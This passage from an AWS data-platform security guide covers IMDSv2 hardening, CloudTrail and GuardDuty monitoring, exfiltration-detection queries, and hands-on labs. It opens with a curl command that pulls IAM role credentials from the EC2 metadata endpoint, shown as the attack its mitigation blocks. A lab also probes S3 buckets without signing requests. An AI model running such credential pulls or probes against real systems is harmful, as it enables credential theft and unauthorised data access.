curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EMR_EC2_DefaultRole
```

**Mitigation:**
```hcl
resource "aws_emr_cluster" "secure" {
  # ... other config ...

  ec2_attributes {
    instance_profile = aws_iam_instance_profile.emr.name
    # Force IMDSv2
    additional_master_security_groups = [aws_security_group.emr_master.id]
  }

  # Force IMDSv2 via launch template
  master_instance_group {
    instance_type = "m5.xlarge"
  }

  configurations_json = jsonencode([
    {
      Classification = "spark-defaults"
      Properties = {
        "spark.hadoop.fs.s3a.aws.credentials.provider" = "com.amazonaws.auth.InstanceProfileCredentialsProvider"
      }
    }
  ])
}

# Launch template forcing IMDSv2
resource "aws_launch_template" "emr_imdsv2" {
  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "required"  # Forces IMDSv2
    http_put_response_hop_limit = 1
  }
}
```

---

## 9. Monitoring and Compliance

### CloudTrail — Data Events

Management events are logged by default. Data events (S3 object-level, DynamoDB item-level) must be explicitly enabled:

```hcl
resource "aws_cloudtrail" "data_events" {
  name                       = "data-lake-trail"
  s3_bucket_name             = aws_s3_bucket.cloudtrail_logs.id
  include_global_service_events = true
  is_multi_region_trail      = true
  enable_log_file_validation = true
  kms_key_id                 = aws_kms_key.cloudtrail.arn

  event_selector {
    read_write_type           = "All"
    include_management_events = true

    data_resource {
      type   = "AWS::S3::Object"
      values = [
        "arn:aws:s3:::company-datalake-raw/",
        "arn:aws:s3:::company-datalake-curated/"
      ]
    }
  }

  event_selector {
    read_write_type           = "All"
    include_management_events = false

    data_resource {
      type   = "AWS::DynamoDB::Table"
      values = ["arn:aws:dynamodb:us-east-1:123456789012:table/feature-store"]
    }
  }

  insight_selector {
    insight_type = "ApiCallRateInsight"
  }
  insight_selector {
    insight_type = "ApiErrorRateInsight"
  }
}
```

### CloudWatch Metrics and Alarms

```hcl
# Alarm: Unusual S3 data transfer
resource "aws_cloudwatch_metric_alarm" "s3_exfil_detection" {
  alarm_name          = "s3-unusual-download-volume"
  comparison_operator = "GreaterThanThreshold"
  evaluation_periods  = 1
  metric_name         = "BytesDownloaded"
  namespace           = "AWS/S3"
  period              = 3600
  statistic           = "Sum"
  threshold           = 10737418240  # 10 GB/hour
  alarm_description   = "Potential data exfiltration: >10GB downloaded in 1 hour"
  alarm_actions       = [aws_sns_topic.security_alerts.arn]

  dimensions = {
    BucketName = "company-datalake-curated"
    FilterId   = "EntireBucket"
  }
}

# Alarm: Kinesis iterator age (consumer falling behind)
resource "aws_cloudwatch_metric_alarm" "kinesis_lag" {
  alarm_name          = "kinesis-consumer-lag"
  comparison_operator = "GreaterThanThreshold"
  evaluation_periods  = 3
  metric_name         = "GetRecords.IteratorAgeMilliseconds"
  namespace           = "AWS/Kinesis"
  period              = 60
  statistic           = "Maximum"
  threshold           = 60000  # 1 minute behind
  alarm_actions       = [aws_sns_topic.ops_alerts.arn]

  dimensions = {
    StreamName = "user-events"
  }
}

# Alarm: Redshift query queue wait time
resource "aws_cloudwatch_metric_alarm" "redshift_queue" {
  alarm_name          = "redshift-wlm-queue-wait"
  comparison_operator = "GreaterThanThreshold"
  evaluation_periods  = 2
  metric_name         = "WLMQueueWaitTime"
  namespace           = "AWS/Redshift"
  period              = 300
  statistic           = "Average"
  threshold           = 30000  # 30 seconds
  alarm_actions       = [aws_sns_topic.ops_alerts.arn]

  dimensions = {
    ClusterIdentifier = "analytics-cluster"
  }
}
```

### AWS Config Rules for Data Services

```hcl
# S3 bucket encryption check
resource "aws_config_config_rule" "s3_encryption" {
  name = "s3-bucket-server-side-encryption-enabled"
  source {
    owner             = "AWS"
    source_identifier = "S3_BUCKET_SERVER_SIDE_ENCRYPTION_ENABLED"
  }
  scope {
    compliance_resource_types = ["AWS::S3::Bucket"]
  }
}

# S3 bucket public read/write prohibition
resource "aws_config_config_rule" "s3_no_public" {
  name = "s3-bucket-public-read-prohibited"
  source {
    owner             = "AWS"
    source_identifier = "S3_BUCKET_PUBLIC_READ_PROHIBITED"
  }
}

# Redshift cluster encryption
resource "aws_config_config_rule" "redshift_encrypted" {
  name = "redshift-cluster-configuration-check"
  source {
    owner             = "AWS"
    source_identifier = "REDSHIFT_CLUSTER_CONFIGURATION_CHECK"
  }
  input_parameters = jsonencode({
    clusterDbEncrypted = "true"
    loggingEnabled     = "true"
  })
}

# Redshift not publicly accessible
resource "aws_config_config_rule" "redshift_no_public" {
  name = "redshift-cluster-public-access-check"
  source {
    owner             = "AWS"
    source_identifier = "REDSHIFT_CLUSTER_PUBLIC_ACCESS_CHECK"
  }
}

# Custom rule: Kinesis stream encryption
resource "aws_config_config_rule" "kinesis_encrypted" {
  name = "kinesis-stream-encrypted"
  source {
    owner             = "AWS"
    source_identifier = "KINESIS_STREAM_ENCRYPTED"
  }
}
```

### GuardDuty for S3

GuardDuty S3 protection detects suspicious access patterns:

- `Discovery:S3/AnomalousBehavior` — unusual API calls from a principal
- `Exfiltration:S3/AnomalousBehavior` — unusual data transfer patterns
- `UnauthorizedAccess:S3/TorIPCaller` — S3 API from Tor exit nodes
- `Impact:S3/PermissionsModification.Unusual` — bucket policy changes
- `Stealth:S3/ServerAccessLoggingDisabled` — logging turned off

```hcl
resource "aws_guardduty_detector" "main" {
  enable = true

  datasources {
    s3_logs {
      enable = true
    }
    kubernetes {
      audit_logs { enable = true }
    }
    malware_protection {
      scan_ec2_instance_with_findings {
        ebs_volumes { enable = true }
      }
    }
  }
}
```

### Amazon Macie for PII Discovery

Macie uses ML to discover, classify, and protect sensitive data in S3:

```python
import boto3

macie = boto3.client('macie2')

# Create classification job
macie.create_classification_job(
    jobType='SCHEDULED',
    name='pii-scan-datalake',
    description='Weekly PII scan of curated data lake',
    s3JobDefinition={
        'bucketDefinitions': [{
            'accountId': '123456789012',
            'buckets': ['company-datalake-curated']
        }],
        'scoping': {
            'includes': {
                'and': [{
                    'simpleScopeTerm': {
                        'comparator': 'STARTS_WITH',
                        'key': 'OBJECT_KEY',
                        'values': ['customers/', 'users/', 'transactions/']
                    }
                }]
            }
        }
    },
    scheduleFrequencyDetails={
        'weekly': {'dayOfWeek': 'MONDAY'}
    },
    managedDataIdentifierSelector='ALL',
    customDataIdentifierIds=['custom-employee-id-regex']
)
```

### Security Hub Aggregation

Security Hub aggregates findings from GuardDuty, Macie, Config, Inspector, and third-party tools:

```hcl
resource "aws_securityhub_account" "main" {}

resource "aws_securityhub_standards_subscription" "cis" {
  standards_arn = "arn:aws:securityhub:::ruleset/cis-aws-foundations-benchmark/v/1.4.0"
}

resource "aws_securityhub_standards_subscription" "aws_best_practices" {
  standards_arn = "arn:aws:securityhub:us-east-1::standards/aws-foundational-security-best-practices/v/1.0.0"
}

# Auto-remediation via EventBridge
resource "aws_cloudwatch_event_rule" "securityhub_critical" {
  name = "securityhub-critical-findings"
  event_pattern = jsonencode({
    source      = ["aws.securityhub"]
    detail-type = ["Security Hub Findings - Imported"]
    detail = {
      findings = {
        Severity = { Label = ["CRITICAL"] }
        Workflow = { Status = ["NEW"] }
        ProductFields = {
          "aws/securityhub/ProductName" = ["GuardDuty", "Macie"]
        }
      }
    }
  })
}
```

### CloudWatch Logs Insights for Data Pipeline Debugging

Query structured logs from Glue, Lambda, and Step Functions:

```
# Find Glue job failures with error details
fields @timestamp, @message
| filter @logStream like /glue/
| filter @message like /ERROR|Exception|FAILED/
| sort @timestamp desc
| limit 50

# Lambda cold start analysis for data processing functions
filter @type = "REPORT"
| stats avg(@duration), max(@duration), avg(@initDuration) by bin(1h)
| sort bin(1h) desc

# Step Functions execution traces
fields execution_arn, state_name, status, error
| filter status = "FAILED"
| sort @timestamp desc
```

### CloudWatch Contributor Insights

Identify top contributors to metrics — useful for hot partition detection:

```hcl
resource "aws_cloudwatch_log_metric_filter" "s3_access_by_principal" {
  name           = "s3-access-by-principal"
  log_group_name = aws_cloudwatch_log_group.cloudtrail.name
  pattern        = "{ $.eventSource = \"s3.amazonaws.com\" && $.eventName = \"GetObject\" }"

  metric_transformation {
    name      = "S3GetObjectByPrincipal"
    namespace = "CustomSecurity"
    value     = "1"
    dimensions = {
      Principal = "$.userIdentity.arn"
      Bucket    = "$.requestParameters.bucketName"
    }
  }
}
```

### VPC Flow Logs for Data Exfiltration

Monitor network traffic from data processing resources:

```hcl
resource "aws_flow_log" "data_vpc" {
  vpc_id               = aws_vpc.data_vpc.id
  traffic_type         = "ALL"
  log_destination_type = "s3"
  log_destination      = aws_s3_bucket.flow_logs.arn
  max_aggregation_interval = 60

  destination_options {
    file_format                = "parquet"
    hive_compatible_partitions = true
    per_hour_partition         = true
  }
}
```

Query for anomalous outbound traffic from Glue/EMR subnets:
```sql
SELECT
    srcaddr,
    dstaddr,
    dstport,
    SUM(bytes) AS total_bytes,
    COUNT(*) AS flow_count
FROM vpc_flow_logs
WHERE srcaddr LIKE '10.0.%'  -- Data VPC CIDR
  AND dstaddr NOT LIKE '10.0.%'  -- External destination
  AND action = 'ACCEPT'
  AND year = '2024' AND month = '06'
GROUP BY srcaddr, dstaddr, dstport
HAVING SUM(bytes) > 1073741824  -- > 1 GB
ORDER BY total_bytes DESC;
```

### Compliance Mapping

| Framework | AWS Service | Coverage Area |
|-----------|-------------|---------------|
| SOC 2 (CC6.1) | KMS, IAM, Lake Formation | Logical access controls |
| SOC 2 (CC6.6) | VPC, Security Groups, NACLs | Network controls |
| SOC 2 (CC7.2) | CloudTrail, GuardDuty | Monitoring |
| HIPAA | KMS (encryption), CloudTrail (audit), Macie (PHI detection) | PHI protection |
| PCI DSS 4.0 (Req 3) | KMS, SSE | Protect stored card data |
| PCI DSS 4.0 (Req 7) | IAM, Lake Formation | Restrict access |
| PCI DSS 4.0 (Req 10) | CloudTrail, CloudWatch | Audit trails |
| GDPR Art. 32 | KMS, VPC endpoints, IAM | Technical measures |
| GDPR Art. 35 | Macie, Config | Data protection impact |

**AWS Artifact** provides on-demand access to AWS compliance reports (SOC 1/2/3, PCI DSS AOC, ISO 27001, etc.).

---

## 10. Lab Exercises

### Lab 1: Build a Secure Data Lake (S3 + Lake Formation + Athena)

**Objective:** Deploy a data lake with fine-grained access control, encryption, and governed access.

**Architecture:**
```
S3 (encrypted, versioned) → Glue Crawler → Catalog → Lake Formation (permissions) → Athena (workgroups)
```

**Step 1 — Create encrypted S3 buckets:**
```bash
# Create KMS key
KEY_ID=$(aws kms create-key --description "Data lake encryption key" \
  --query 'KeyMetadata.KeyId' --output text)

aws kms create-alias --alias-name alias/datalake-key --target-key-id "$KEY_ID"

# Create bucket with encryption and public access block
aws s3api create-bucket \
  --bucket lab-datalake-curated-$(aws sts get-caller-identity --query Account --output text) \
  --region us-east-1

aws s3api put-bucket-encryption \
  --bucket lab-datalake-curated-$(aws sts get-caller-identity --query Account --output text) \
  --server-side-encryption-configuration '{
    "Rules": [{
      "ApplyServerSideEncryptionByDefault": {
        "SSEAlgorithm": "aws:kms",
        "KMSMasterKeyID": "'"$KEY_ID"'"
      },
      "BucketKeyEnabled": true
    }]
  }'

aws s3api put-public-access-block \
  --bucket lab-datalake-curated-$(aws sts get-caller-identity --query Account --output text) \
  --public-access-block-configuration '{
    "BlockPublicAcls": true,
    "IgnorePublicAcls": true,
    "BlockPublicPolicy": true,
    "RestrictPublicBuckets": true
  }'
```

**Step 2 — Register location with Lake Formation:**
```python
import boto3

lf = boto3.client('lakeformation')

# Register the S3 location
lf.register_resource(
    ResourceArn='arn:aws:s3:::lab-datalake-curated-123456789012',
    UseServiceLinkedRole=True
)

# Revoke default IAMAllowedPrincipals (critical for Lake Formation to enforce)
lf.batch_revoke_permissions(
    Entries=[{
        'Id': '1',
        'Principal': {'DataLakePrincipal': {'DataLakePrincipalIdentifier': 'IAM_ALLOWED_PRINCIPALS'}},
        'Resource': {'Database': {'Name': 'lab_analytics'}},
        'Permissions': ['ALL'],
        'PermissionsWithGrantOption': ['ALL']
    }]
)
```

**Step 3 — Create Glue crawler and catalog:**
```bash
# Upload sample data
aws s3 cp sample_events.parquet \
  s3://lab-datalake-curated-123456789012/events/year=2024/month=06/day=15/

# Create crawler
aws glue create-crawler \
  --name lab-events-crawler \
  --role GlueCrawlerRole \
  --database-name lab_analytics \
  --targets '{"S3Targets":[{"Path":"s3://lab-datalake-curated-123456789012/events/"}]}'

aws glue start-crawler --name lab-events-crawler
```

**Step 4 — Configure Lake Formation permissions:**
```python
# Grant analyst role column-level access (exclude PII)
lf.grant_permissions(
    Principal={'DataLakePrincipal': {'DataLakePrincipalIdentifier': 'arn:aws:iam::123456789012:role/LabAnalyst'}},
    Resource={
        'TableWithColumns': {
            'DatabaseName': 'lab_analytics',
            'Name': 'events',
            'ColumnNames': ['event_type', 'event_timestamp', 'properties']
            # user_id excluded — considered PII
        }
    },
    Permissions=['SELECT']
)

# Grant data engineer full access
lf.grant_permissions(
    Principal={'DataLakePrincipal': {'DataLakePrincipalIdentifier': 'arn:aws:iam::123456789012:role/LabDataEngineer'}},
    Resource={
        'Table': {'DatabaseName': 'lab_analytics', 'Name': 'events'}
    },
    Permissions=['SELECT', 'INSERT', 'DELETE', 'DESCRIBE', 'ALTER']
)
```

**Step 5 — Create Athena workgroups with result isolation:**
```bash
aws athena create-work-group \
  --name analysts \
  --configuration '{
    "ResultConfiguration": {
      "OutputLocation": "s3://lab-athena-results-123456789012/analysts/",
      "EncryptionConfiguration": {"EncryptionOption": "SSE_KMS", "KmsKey": "'"$KEY_ID"'"}
    },
    "EnforceWorkGroupConfiguration": true,
    "PublishCloudWatchMetricsEnabled": true,
    "BytesScannedCutoffPerQuery": 10737418240
  }'
```

**Validation:** Query as the analyst role and confirm PII columns are inaccessible. Query as engineer and confirm full access.

---

### Lab 2: S3 Bucket Security Assessment (Authorized Pentest)

**Objective:** Perform an authorized security assessment of S3 buckets in a test environment.

**Scope:** Only assess buckets in the designated lab account. This exercise requires explicit written authorization.

**Step 1 — Reconnaissance:**
```python
import boto3
import json

s3 = boto3.client('s3')
findings = []

def assess_bucket(bucket_name: str) -> list[dict]:
    checks = []
    
    # Check 1: Public access block
    try:
        pab = s3.get_public_access_block(Bucket=bucket_name)['PublicAccessBlockConfiguration']
        if not all([pab['BlockPublicAcls'], pab['IgnorePublicAcls'],
                    pab['BlockPublicPolicy'], pab['RestrictPublicBuckets']]):
            checks.append({
                'severity': 'HIGH',
                'check': 'PublicAccessBlock',
                'finding': f"Incomplete public access block: {pab}"
            })
    except Exception:
        checks.append({
            'severity': 'CRITICAL',
            'check': 'PublicAccessBlock',
            'finding': 'No public access block configured'
        })
    
    # Check 2: Encryption
    try:
        enc = s3.get_bucket_encryption(Bucket=bucket_name)
        rules = enc['ServerSideEncryptionConfiguration']['Rules']
        for rule in rules:
            algo = rule['ApplyServerSideEncryptionByDefault']['SSEAlgorithm']
            if algo == 'AES256':
                checks.append({
                    'severity': 'MEDIUM',
                    'check': 'Encryption',
                    'finding': f"Uses SSE-S3 (AES256) instead of SSE-KMS — no key audit trail"
                })
    except Exception:
        checks.append({
            'severity': 'HIGH',
            'check': 'Encryption',
            'finding': 'No default encryption configured'
        })
    
    # Check 3: Versioning
    versioning = s3.get_bucket_versioning(Bucket=bucket_name)
    if versioning.get('Status') != 'Enabled':
        checks.append({
            'severity': 'MEDIUM',
            'check': 'Versioning',
            'finding': 'Versioning not enabled — no protection against accidental deletion'
        })
    
    # Check 4: Logging
    try:
        logging_config = s3.get_bucket_logging(Bucket=bucket_name)
        if 'LoggingEnabled' not in logging_config:
            checks.append({
                'severity': 'MEDIUM',
                'check': 'Logging',
                'finding': 'Server access logging not enabled'
            })
    except Exception:
        pass
    
    # Check 5: Object ownership
    try:
        ownership = s3.get_bucket_ownership_controls(Bucket=bucket_name)
        rules = ownership['OwnershipControls']['Rules']
        if rules[0]['ObjectOwnership'] != 'BucketOwnerEnforced':
            checks.append({
                'severity': 'MEDIUM',
                'check': 'ObjectOwnership',
                'finding': f"Object ownership: {rules[0]['ObjectOwnership']} — ACLs still active"
            })
    except Exception:
        checks.append({
            'severity': 'LOW',
            'check': 'ObjectOwnership',
            'finding': 'Cannot determine object ownership settings'
        })
    
    # Check 6: Cross-account access in bucket policy
    try:
        policy = json.loads(s3.get_bucket_policy(Bucket=bucket_name)['Policy'])
        account_id = boto3.client('sts').get_caller_identity()['Account']
        for stmt in policy.get('Statement', []):
            if stmt['Effect'] == 'Allow':
                principals = stmt.get('Principal', {})
                if isinstance(principals, dict):
                    aws_principals = principals.get('AWS', [])
                    if isinstance(aws_principals, str):
                        aws_principals = [aws_principals]
                    for p in aws_principals:
                        if account_id not in p and p != '*':
                            checks.append({
                                'severity': 'HIGH',
                                'check': 'CrossAccountAccess',
                                'finding': f"Cross-account access granted to: {p}"
                            })
    except Exception:
        pass
    
    return checks

# Run assessment
for bucket in s3.list_buckets()['Buckets']:
    bucket_findings = assess_bucket(bucket['Name'])
    if bucket_findings:
        findings.extend([{**f, 'bucket': bucket['Name']} for f in bucket_findings])

# Report
for f in sorted(findings, key=lambda x: {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}[x['severity']]):
    print(f"[{f['severity']}] {f['bucket']} — {f['check']}: {f['finding']}")
```

**Step 2 — Test for data exposure:**
```bash
# Check if objects are accessible without authentication (from outside)
# ONLY on lab buckets with explicit authorization
aws s3 ls s3://lab-test-public-bucket/ --no-sign-request 2>/dev/null && echo "PUBLIC ACCESS CONFIRMED"

# Check for presigned URL abuse potential
# Generate presigned URL and verify expiration enforcement
aws s3 presign s3://lab-datalake-curated-123456789012/events/sample.parquet --expires-in 60
```

---

### Lab 3: Encryption-at-Rest Strategy

**Objective:** Implement consistent encryption across S3, Redshift, Kinesis, and Glue with a single CMK hierarchy.

**Step 1 — Create multi-region KMS key:**
```hcl
resource "aws_kms_key" "data_platform" {
  description             = "Data platform encryption key"
  deletion_window_in_days = 30
  enable_key_rotation     = true
  multi_region            = true

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "RootAccountAdmin"
        Effect = "Allow"
        Principal = { AWS = "arn:aws:iam::123456789012:root" }
        Action = "kms:*"
        Resource = "*"
      },
      {
        Sid    = "DataServicesUsage"
        Effect = "Allow"
        Principal = { AWS = [
          "arn:aws:iam::123456789012:role/GlueETLRole",
          "arn:aws:iam::123456789012:role/RedshiftRole",
          "arn:aws:iam::123456789012:role/KinesisRole",
          "arn:aws:iam::123456789012:role/AthenaRole"
        ]}
        Action = [
          "kms:Decrypt",
          "kms:GenerateDataKey",
          "kms:GenerateDataKeyWithoutPlaintext",
          "kms:DescribeKey",
          "kms:ReEncrypt*"
        ]
        Resource = "*"
        Condition = {
          StringEquals = {
            "kms:ViaService" = [
              "s3.us-east-1.amazonaws.com",
              "redshift.us-east-1.amazonaws.com",
              "kinesis.us-east-1.amazonaws.com",
              "glue.us-east-1.amazonaws.com"
            ]
          }
        }
      },
      {
        Sid    = "DenyExternalUsage"
        Effect = "Deny"
        Principal = "*"
        Action = "kms:*"
        Resource = "*"
        Condition = {
          StringNotEquals = { "aws:PrincipalOrgID" = "o-abc123def4" }
          Bool = { "aws:PrincipalIsAWSService" = "false" }
        }
      }
    ]
  })
}

resource "aws_kms_alias" "data_platform" {
  name          = "alias/data-platform"
  target_key_id = aws_kms_key.data_platform.key_id
}
```

**Step 2 — Apply to all services:**
```hcl
# S3 bucket key (reduces KMS API calls by 99%)
resource "aws_s3_bucket_server_side_encryption_configuration" "datalake" {
  bucket = aws_s3_bucket.data_lake["curated"].id

  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm     = "aws:kms"
      kms_master_key_id = aws_kms_key.data_platform.arn
    }
    bucket_key_enabled = true
  }
}

# Redshift cluster encryption
resource "aws_redshift_cluster" "analytics" {
  cluster_identifier = "analytics-cluster"
  encrypted          = true
  kms_key_id         = aws_kms_key.data_platform.arn
  # ... other config
}

# Kinesis stream encryption
resource "aws_kinesis_stream" "events" {
  name            = "user-events"
  encryption_type = "KMS"
  kms_key_id      = aws_kms_key.data_platform.id
  # ... other config
}

# Glue security configuration
resource "aws_glue_security_configuration" "encrypted" {
  name = "data-platform-encryption"

  encryption_configuration {
    s3_encryption {
      s3_encryption_mode = "SSE-KMS"
      kms_key_arn        = aws_kms_key.data_platform.arn
    }
    cloudwatch_encryption {
      cloudwatch_encryption_mode = "SSE-KMS"
      kms_key_arn                = aws_kms_key.data_platform.arn
    }
    job_bookmarks_encryption {
      job_bookmarks_encryption_mode = "CSE-KMS"
      kms_key_arn                   = aws_kms_key.data_platform.arn
    }
  }
}
```

**Validation:**
```bash
# Verify all services use the expected key
aws s3api head-object --bucket lab-datalake-curated-123456789012 --key events/sample.parquet \
  --query 'ServerSideEncryption,SSEKMSKeyId'

aws redshift describe-clusters --cluster-identifier analytics-cluster \
  --query 'Clusters[0].[Encrypted,KmsKeyId]'

aws kinesis describe-stream --stream-name user-events \
  --query 'StreamDescription.[EncryptionType,KeyId]'
```

---

### Lab 4: CloudTrail-Based Exfiltration Detection

**Objective:** Build detection rules for data exfiltration attempts using CloudTrail data events.

**Step 1 — Create Athena table over CloudTrail logs:**
```sql
CREATE EXTERNAL TABLE cloudtrail_logs (
    eventVersion STRING,
    userIdentity STRUCT<
        type: STRING,
        principalId: STRING,
        arn: STRING,
        accountId: STRING,
        invokedBy: STRING,
        accessKeyId: STRING,
        userName: STRING,
        sessionContext: STRUCT<
            attributes: STRUCT<mfaAuthenticated: STRING, creationDate: STRING>,
            sessionIssuer: STRUCT<type: STRING, principalId: STRING, arn: STRING, accountId: STRING, userName: STRING>
        >
    >,
    eventTime STRING,
    eventSource STRING,
    eventName STRING,
    awsRegion STRING,
    sourceIPAddress STRING,
    userAgent STRING,
    errorCode STRING,
    errorMessage STRING,
    requestParameters STRING,
    responseElements STRING,
    additionalEventData STRING,
    requestId STRING,
    eventId STRING,
    resources ARRAY<STRUCT<arn: STRING, accountId: STRING, type: STRING>>,
    eventType STRING,
    apiVersion STRING,
    readOnly STRING,
    recipientAccountId STRING,
    serviceEventDetails STRING,
    sharedEventId STRING,
    vpcEndpointId STRING
)
PARTITIONED BY (region STRING, year STRING, month STRING, day STRING)
ROW FORMAT SERDE 'org.apache.hive.hcatalog.data.JsonSerDe'
LOCATION 's3://cloudtrail-logs-123456789012/AWSLogs/123456789012/CloudTrail/'
TBLPROPERTIES (
    'projection.enabled' = 'true',
    'projection.region.type' = 'enum',
    'projection.region.values' = 'us-east-1,us-west-2,eu-west-1',
    'projection.year.type' = 'integer',
    'projection.year.range' = '2023,2030',
    'projection.month.type' = 'integer',
    'projection.month.range' = '1,12',
    'projection.month.digits' = '2',
    'projection.day.type' = 'integer',
    'projection.day.range' = '1,31',
    'projection.day.digits' = '2',
    'storage.location.template' = 's3://cloudtrail-logs-123456789012/AWSLogs/123456789012/CloudTrail/${region}/${year}/${month}/${day}/'
);
```

**Step 2 — Detection queries:**

```sql
-- Detection 1: Unusual bulk GetObject activity (potential exfiltration)
SELECT
    userIdentity.arn AS principal,
    sourceIPAddress,
    COUNT(*) AS get_count,
    COUNT(DISTINCT json_extract_scalar(requestParameters, '$.bucketName')) AS bucket_count,
    date_trunc('hour', from_iso8601_timestamp(eventTime)) AS hour
FROM cloudtrail_logs
WHERE eventName = 'GetObject'
  AND year = '2024' AND month = '06'
GROUP BY 1, 2, 5
HAVING COUNT(*) > 1000
ORDER BY get_count DESC;

-- Detection 2: S3 objects copied to external accounts
SELECT
    eventTime,
    userIdentity.arn AS principal,
    json_extract_scalar(requestParameters, '$.bucketName') AS source_bucket,
    json_extract_scalar(additionalEventData, '$.x-amz-copy-source') AS copy_source,
    sourceIPAddress
FROM cloudtrail_logs
WHERE eventName = 'PutObject'
  AND json_extract_scalar(requestParameters, '$.x-amz-acl') IN ('public-read', 'public-read-write', 'authenticated-read')
  AND year = '2024';

-- Detection 3: Athena CTAS to non-standard locations
SELECT
    eventTime,
    userIdentity.arn AS principal,
    json_extract_scalar(requestParameters, '$.queryString') AS query,
    sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'athena.amazonaws.com'
  AND eventName = 'StartQueryExecution'
  AND (
    json_extract_scalar(requestParameters, '$.queryString') LIKE '%CREATE TABLE%external_location%'
    OR json_extract_scalar(requestParameters, '$.queryString') LIKE '%UNLOAD%'
  )
  AND year = '2024';

-- Detection 4: Credential access from Glue jobs to unusual services
SELECT
    eventTime,
    userIdentity.arn AS principal,
    eventName,
    eventSource,
    sourceIPAddress,
    userAgent
FROM cloudtrail_logs
WHERE userIdentity.arn LIKE '%GlueETLRole%'
  AND eventSource NOT IN ('s3.amazonaws.com', 'glue.amazonaws.com', 'kms.amazonaws.com', 'logs.amazonaws.com')
  AND year = '2024'
ORDER BY eventTime DESC;

-- Detection 5: S3 public access block removal
SELECT
    eventTime,
    userIdentity.arn AS principal,
    json_extract_scalar(requestParameters, '$.bucketName') AS bucket,
    eventName,
    sourceIPAddress
FROM cloudtrail_logs
WHERE eventName IN (
    'DeleteBucketPublicAccessBlock',
    'PutBucketPublicAccessBlock',
    'PutBucketAcl',
    'PutBucketPolicy'
)
  AND year = '2024'
ORDER BY eventTime DESC;
```

**Step 3 — Automated alerting with EventBridge + Lambda:**
```python
# Lambda function triggered by CloudTrail events via EventBridge
import boto3
import json
import os

sns = boto3.client('sns')
TOPIC_ARN = os.environ['ALERT_TOPIC_ARN']

def lambda_handler(event, context):
    detail = event['detail']
    event_name = detail['eventName']
    principal = detail.get('userIdentity', {}).get('arn', 'unknown')
    source_ip = detail.get('sourceIPAddress', 'unknown')
    
    alerts = []
    
    # Alert 1: Public access block removed
    if event_name == 'DeleteBucketPublicAccessBlock':
        bucket = detail.get('requestParameters', {}).get('bucketName', 'unknown')
        alerts.append({
            'severity': 'CRITICAL',
            'title': f"S3 Public Access Block REMOVED on {bucket}",
            'detail': f"Principal: {principal}, IP: {source_ip}"
        })
    
    # Alert 2: Large number of GetObject in short window
    if event_name == 'GetObject':
        # This would be handled by CloudWatch metric filter + alarm instead
        pass
    
    # Alert 3: Cross-account replication configured
    if event_name == 'PutBucketReplication':
        bucket = detail.get('requestParameters', {}).get('bucketName', 'unknown')
        alerts.append({
            'severity': 'HIGH',
            'title': f"Replication configured on {bucket}",
            'detail': f"Principal: {principal}, IP: {source_ip}, Review destination account"
        })
    
    for alert in alerts:
        sns.publish(
            TopicArn=TOPIC_ARN,
            Subject=f"[{alert['severity']}] {alert['title']}",
            Message=json.dumps(alert, indent=2)
        )
    
    return {'statusCode': 200, 'alerts_sent': len(alerts)}
```

**EventBridge rule for the detection Lambda:**
```hcl
resource "aws_cloudwatch_event_rule" "exfil_detection" {
  name = "s3-exfil-detection"
  event_pattern = jsonencode({
    source      = ["aws.s3"]
    detail-type = ["AWS API Call via CloudTrail"]
    detail = {
      eventSource = ["s3.amazonaws.com"]
      eventName   = [
        "DeleteBucketPublicAccessBlock",
        "PutBucketAcl",
        "PutBucketPolicy",
        "PutBucketReplication",
        "PutObjectAcl"
      ]
    }
  })
}

resource "aws_cloudwatch_event_target" "exfil_lambda" {
  rule      = aws_cloudwatch_event_rule.exfil_detection.name
  target_id = "ExfilDetectionLambda"
  arn       = aws_lambda_function.exfil_detection.arn
}
```

---

## Summary of Key Security Controls

| Layer | Control | Implementation |
|-------|---------|----------------|
| Network | VPC endpoints | Gateway (S3/DDB), Interface (Glue/KMS/Kinesis) |
| Network | No internet access | Private subnets, no IGW/NAT for data VPC |
| Identity | Least privilege | Scoped IAM policies per service role |
| Identity | Lake Formation | Fine-grained column/row/cell access |
| Encryption | At rest | SSE-KMS with CMK on all services |
| Encryption | In transit | TLS enforced (bucket policy `aws:SecureTransport`) |
| Detection | CloudTrail data events | S3 object-level + DynamoDB item-level |
| Detection | GuardDuty S3 | Anomalous access patterns |
| Detection | Macie | PII/PHI discovery |
| Compliance | Config rules | Continuous compliance monitoring |
| Governance | SCPs | Organization-wide guardrails |
| Governance | Tag-based access | LF-TBAC for scalable permissions |

---

## References

- AWS Well-Architected Framework — Data Analytics Lens
- AWS Security Best Practices (whitepaper)
- CIS AWS Foundations Benchmark v1.4
- NIST SP 800-53 Rev 5 — mapped to AWS services
- AWS re:Invent sessions: SEC401, ANT301, ANT401
- Apache Iceberg specification v1.4
- AWS Documentation: Lake Formation permissions model
